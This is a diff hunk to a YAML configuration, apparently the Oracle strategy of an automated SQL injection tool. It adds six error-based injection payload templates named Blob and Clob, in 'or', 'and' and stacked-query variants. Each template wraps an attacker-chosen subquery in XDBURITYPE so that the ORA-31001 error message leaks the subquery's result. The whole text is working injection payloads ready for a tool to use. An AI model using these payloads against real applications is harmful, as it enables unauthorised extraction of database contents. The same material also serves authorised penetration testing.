@@ -343,3 +343,35 @@ strategy:
           )
       ) from dual
      capacity: 124
+
+   - name: Blob:or
+     query: |
+      /* ORA-31001: Invalid resource handle or path name "<sqli>" [SQL State=99999, DB Errorcode=31001] */
+      or 1=utl_raw.cast_to_varchar2(XDBURITYPE((${window})).getblob())
+     capacity: 512
+
+   - name: Blob:and
+     query: |
+      and 1=utl_raw.cast_to_varchar2(XDBURITYPE((${window})).getblob())
+     capacity: 512
+
+   - name: Blob:stack
+     query: |
+      ; select utl_raw.cast_to_varchar2(XDBURITYPE((${window})).getblob()) from dual
+     capacity: 512
+
+   - name: Clob:or
+     query: |
+      /* ORA-31001: Invalid resource handle or path name "<sqli>" [SQL State=99999, DB Errorcode=31001] */
+      or 1=dbms_lob.substr(XDBURITYPE((${window})).getclob(),0,0)
+     capacity: 512
+
+   - name: Clob:and
+     query: |
+      and 1=dbms_lob.substr(XDBURITYPE((${window})).getclob(),0,0)
+     capacity: 512
+
+   - name: Clob:stack
+     query: |
+      ; select dbms_lob.substr(XDBURITYPE((${window})).getclob(),0,0) from dual
+     capacity: 512
